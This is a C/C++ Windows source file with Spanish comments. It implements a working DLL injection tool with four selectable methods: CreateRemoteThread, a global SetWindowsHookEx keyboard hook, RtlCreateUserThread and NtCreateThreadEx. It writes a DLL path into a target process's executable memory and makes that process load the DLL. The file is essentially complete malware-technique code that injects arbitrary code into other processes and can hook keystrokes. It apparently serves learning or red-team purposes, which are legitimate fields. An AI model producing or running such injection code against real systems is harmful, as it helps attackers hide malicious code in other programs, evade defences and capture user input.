#include <stdio.h>
#include <windows.h>
#include <iostream>

//The prototype of RtlCreateUserThread from undocumented.ntinternals.com
typedef DWORD(WINAPI* functypeRtlCreateUserThread)(
    HANDLE                     ProcessHandle,
    PSECURITY_DESCRIPTOR     SecurityDescriptor,
    BOOL                     CreateSuspended,
    ULONG                    StackZeroBits,
    PULONG                    StackReserved,
    PULONG                    StackCommit,
    LPVOID                    StartAddress,
    LPVOID                    StartParameter,
    HANDLE                     ThreadHandle,
    LPVOID                    ClientID
);

//The prototype of NtCreateThreadEx from undocumented.ntinternals.com
typedef DWORD(WINAPI* functypeNtCreateThreadEx)(
    PHANDLE                 ThreadHandle,
    ACCESS_MASK             DesiredAccess,
    LPVOID                  ObjectAttributes,
    HANDLE                  ProcessHandle,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    LPVOID                  lpParameter,
    BOOL                    CreateSuspended,
    DWORD                   dwStackSize,
    DWORD                   Unknown1,
    DWORD                   Unknown2,
    LPVOID                  Unknown3
    );



int main()
{
    // Obtenemos el método a utilizar para inyectar la DLL
    int method;
    printf("Select DLL Injection \n(1=CreateRemoteThread, 2=SetWindowsHooxEx, 3=CreateUserThread, 4=CreateThreadEx): ");
    scanf_s("%d", &method);

    // Obtenemos el PATH a la DLL a inyectar
    char dllPath[255];
    printf("Path de la dll a inyectar: ");
    scanf_s("%s", dllPath, sizeof(dllPath));

    // Obtenemos el handle al proceso objetivo
    int processId;
    printf("Id del proceso objetivo: ");
    scanf_s("%d", &processId);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
        printf("No se pudo abrir el proceso objetivo\n");
        return -1;
    }

    // Asignamos memoria en el proceso objetivo
    PVOID remoteMemory = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("Remote memory: %p\n", remoteMemory);

    // Escribimos el nombre de la dll que queremos que el proceso objetivo cargue
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(hProcess, remoteMemory, dllPath, sizeof(dllPath), &bytesWritten);

    // --------------------------------- CREATE REMOTE THREAD -----------------------------------------------------
    if (method == 1) {
        // Creamos un thread que invoca loadlibrary en el proceso destino
        DWORD thread_id = 0;
        CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, remoteMemory, 0, &thread_id);
    }

    // ----------------------------------- SET WINDOWS HOOK EX ---------------------------------------------------------
    if (method == 2) {
        // Cargamos la dll
        HMODULE dll = LoadLibraryA((LPCSTR)dllPath);
        if (dll == NULL) {
            printf("No se encontró la DLL.\n");
            getchar();
            return -1;
        }

        // Obtenemos la dirección de la función dentro de la dll
        HOOKPROC address = (HOOKPROC)GetProcAddress(dll, "meconnect");

        // Hookeamos la función
        HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, address, dll, 0);
        getchar();
        UnhookWindowsHookEx(handle);
    }

    // --------------------------------- CREATE USER THREAD -----------------------------------------------------
    if (method == 3) {
       // Obtenemos un Handle a NTDLL.DLL que contiene la función CreateUserThread
        HMODULE hNtDllModule = GetModuleHandleA("ntdll.dll");
        if (hNtDllModule == NULL)
        {
            return NULL;
        }

        // Instanciamos la función
        functypeRtlCreateUserThread funcRtlCreateUserThread = (functypeRtlCreateUserThread)GetProcAddress(hNtDllModule, "RtlCreateUserThread");
        if (!funcRtlCreateUserThread)
        {
            return NULL;
        }
        // Creamos un thread que invoca LoadLibraryA en el proceso destino usando CreateUserThread
        HANDLE thread_id = NULL;
        funcRtlCreateUserThread(hProcess, NULL, 0, 0, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, remoteMemory, &thread_id, NULL);
    }

    // --------------------------------- NT CREATE THREAD EX -----------------------------------------------------
    if (method == 4) {
        // Obtenemos un Handle a NTDLL.DLL que contiene la función CreateUserThread
        HMODULE hNtDllModule = GetModuleHandleA("ntdll.dll");
        if (hNtDllModule == NULL)
        {
            return NULL;
        }

        // Instanciamos la función CreateThreadEx
        functypeNtCreateThreadEx funcNtCreateThreadEx = (functypeNtCreateThreadEx)GetProcAddress(hNtDllModule, "NtCreateThreadEx");
        if (!funcNtCreateThreadEx)
        {
            printf("No se pudo encontrar la función NtCreateThreadEx");
            return NULL;
        }

        HANDLE hThread = NULL;
        funcNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)LoadLibraryA, remoteMemory, FALSE, NULL, NULL, NULL, NULL);
    }
    
}
